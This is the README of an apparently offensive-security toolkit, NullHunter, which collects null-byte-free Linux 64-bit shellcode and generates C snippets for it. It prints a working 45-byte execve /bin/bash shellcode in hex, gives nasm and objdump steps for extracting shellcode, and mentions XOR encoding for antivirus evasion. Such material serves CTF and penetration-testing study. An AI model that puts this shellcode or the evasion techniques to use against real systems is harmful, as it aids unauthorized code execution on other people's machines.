# NullHunter

![NullHunter-removebg-preview](https://github.com/user-attachments/assets/42b5d78c-0172-4846-85c2-c1b39d503fb5)


> A specialized toolkit for null-byte free shellcode management and exploitation

NullHunter is a comprehensive solution for security researchers, CTF players, and penetration testers who work with shellcodes. It provides both a curated collection of null-byte free shellcodes and a graphical management interface for easy selection, viewing, and deployment of these shellcodes.

## Features

- **Null-Byte Free Shellcodes**: All included shellcodes are carefully crafted to contain no null bytes (0x00), making them suitable for exploiting string handling vulnerabilities
- **Graphical Interface**: Easy-to-use shellcode selection and management GUI
- **Multi-Architecture Support**: Organized collection for different architectures (currently focused on Linux 64-bit)
- **Code Snippets**: Automatic generation of C code snippets for easy integration
- **Size Optimization**: Shellcodes are optimized for minimal size to fit in constrained buffer spaces
- **Obfuscation Techniques**: Includes techniques like XOR encoding for AV evasion

## Installation

```bash
# Clone the repository
git clone https://github.com/yourusername/NullHunter.git
cd NullHunter

# Install dependencies
pip install -r requirements.txt

# Run NullHunter
python NullHunter.py
```

## Usage

### Graphical Interface

Launch the GUI application to interactively work with shellcodes:

```bash
python NullHunter.py
```

The interface has two main tabs:
1. **Shellcode Selection**: Browse and select from available shellcodes
2. **Shellcode Output**: View the selected shellcode in hex format and get the corresponding C code snippet

### Command-Line Usage

NullHunter also supports command-line operation for integration into scripts and automation:
#### Basic usage
```bash
# Basic usage
python3 NullHunter.py basic_bash --output shellcode.txt
Loading basic_bash...

Shellcode (\x format):
\x48\x31\xc0\x50\x48\x89\xe2\x50\x48\xbf\x2f\x2f\x2f\x2f\x62\x61\x73\x68\x57\x48\xbf\x2f\x2f\x2f\x2f\x62\x69\x6e\x2f\x57\x48\x89\xe7\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05

Shellcode written to shellcode.txt

Shellcode size: 45 bytes
```
#### List all shellcodes
```bash
# List available shellcodes
python3 NullHunter.py  -l

Available Shellcodes:
================================================================================
Name                           Category        Description
--------------------------------------------------------------------------------
bash_with_string               Unknown         No description available
basic_bash                     Linux 64 bits   No description available
XoredBash                      Linux 64 bits   No description available
basic_sh                       Linux 64 bits   No description available
```

### Manual Shellcode Compilation

You can also compile and extract shellcodes manually:

```bash
# Step 1: Compile the shellcode
nasm -f elf64 shellcode/Linux64bits/basic_bash/shellcode.asm -o shellcode.o

# Step 2: Extract the shellcode bytes
for i in $(objdump -d shellcode.o | grep "^ " | cut -f2); do echo -n '\x'$i; done; echo
```



## Shellcode Collection

### Currently Available Shellcodes

| Name | Architecture | Description | Size |
|------|--------------|-------------|------|
| bash_with_string | Linux 64 bits | Execve /bin/bash with string obfuscation | Varies |
| basic_bash | Linux 64 bits | Basic execve /bin/bash | 45 bytes |
| basic_sh | Linux 64 bits | Basic execve /bin/sh | Varies |
| XoredBash | Linux 64 bits | XOR-encoded /bin/bash execution | Varies |

### Adding Custom Shellcodes

To add your own shellcode to the collection:

1. Create a new directory under the appropriate architecture folder
2. Add your assembly code as `shellcode.asm` with detailed comments
3. Optionally include a `raw.txt` file with the compiled shellcode bytes
4. Restart NullHunter to load your new shellcode

## Project Structure

```
NullHunter/
├── NullHunter.py        # Main application
├── README.md            # This file
├── requirements.txt     # Python dependencies
└── shellcode/           # Shellcode collection
    └── Linux64bits/     # Linux 64-bit shellcodes
        ├── bash_with_string/
        │   ├── raw.txt
        │   └── shellcode.asm
        ├── basic_bash/
        │   ├── raw.txt
        │   └── shellcode.asm
        ├── basic_sh/
        │   ├── raw.txt
        │   └── shellcode.asm
        └── XoredBash/
            ├── raw.txt
            └── shellcode.asm
```


## Disclaimer

NullHunter and its shellcodes are provided for educational and legitimate security testing purposes only. Use them responsibly and only on systems you have permission to test. The creators are not responsible for any misuse or damage caused by this tool.

